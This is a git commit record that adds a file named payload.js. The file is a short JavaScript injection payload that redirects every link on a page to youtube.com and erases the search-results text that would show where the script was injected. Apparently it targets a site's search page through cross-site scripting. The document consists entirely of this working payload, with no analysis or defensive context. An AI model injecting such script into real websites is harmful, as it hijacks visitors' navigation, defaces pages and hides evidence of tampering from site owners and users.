42b8989f0dbd53146b44064b5cf81659726688e5
VmpireViGil0 <vmpirevigil@gmail.com>
2024-09-20 03:01:59 +0600

    Add files via upload

---
+++ payload.js
@@ -0,0 +1,10 @@
+document.querySelectorAll('a').forEach(function(link){
+  link.href='https://youtube.com';
+});
+var elements = document.body.querySelectorAll("*");
+elements.forEach(function(element){
+  if (element.innerText.includes("Search Results") || 
+      element.innerText.includes("3 results were found for the search for")) {
+    element.innerText = element.innerText.replace("Search Results", "").replace("3 results were found for the search for", "");
+  }
+});
